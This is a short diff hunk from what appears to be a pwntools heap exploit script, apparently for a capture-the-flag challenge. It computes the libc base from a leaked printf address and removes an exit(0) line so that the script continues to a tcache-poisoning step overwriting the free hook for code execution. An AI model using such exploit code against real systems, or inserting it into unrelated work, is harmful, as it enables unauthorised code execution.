@@ -233,7 +233,6 @@ r.recvline()
 leak = u64(r.recvline().strip().ljust(8, b"\x00"))
 libc.address = leak - libc.sym.printf
 libcbase()
-exit(0)
 #tcache poison to get RCE by overwriting the free hook
 alloc(0x98)
 free()
